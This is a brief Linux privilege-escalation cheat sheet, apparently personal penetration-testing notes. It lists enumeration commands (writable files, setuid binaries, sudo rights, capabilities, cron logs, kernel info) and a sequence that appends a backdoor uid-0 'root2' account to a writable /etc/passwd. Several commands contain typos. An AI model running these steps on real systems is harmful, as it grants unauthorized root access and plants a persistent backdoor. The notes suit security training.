# Linux PrivEsc
## Find interesting files
`find / -writable -type f 2>/dev/null`  #Writable files\
`find / -writable -type d 2>/dev/null` #Writable directories\
`find / -perm -u=s -type f 2>/dev/null` #Setuid executables

## Passwd file writable?
`s -al /var/etc/passwd`\
`lopenssl passwd w00t`\
`echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`\
`su root2`

## OS information --> kernel exploit?
`hostname`\
`cat /etc/issue`\
`cat /etc/os-release`\
`uname -a`

## Envirionment variables
`env`

## Sudo privileges
`sudo -l`

## Running services
`ps -aux` (evt met watch)

## Cron
`grep "CRON"  /var/log/syslog`

## Possible overprived services/applications
`/usr/sbin/getcap -r / 2>/dev/null`

